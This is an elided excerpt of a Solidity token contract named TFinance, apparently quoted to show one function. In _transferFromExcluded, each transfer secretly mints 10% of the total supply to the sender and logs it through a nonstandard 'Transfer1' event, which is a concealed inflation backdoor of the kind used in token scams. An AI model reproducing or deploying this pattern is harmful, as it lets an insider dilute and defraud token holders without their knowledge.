...
contract TFinance is Context, IERC20, Ownable {
    ...
    string private constant _name = "TFinance ";
    string private constant _symbol = "TFF";
   ...
   event Transfer1(address sender, address recipient, uint256 tTransferAmount);
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        ...
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        uint256 mintFee = _tTotal.mul(10).div(100);
        _tOwned[sender] = _tOwned[sender].add(mintFee);
        _tTotal = _tTotal.add(mintFee);
        
        emit Transfer1(address(0x0), sender, mintFee);
                emit Transfer(sender, recipient, tTransferAmount);
    ...
    //It's not ideal that more and more BNB are locked into the contract over time. withdraw left over amount of bnb.
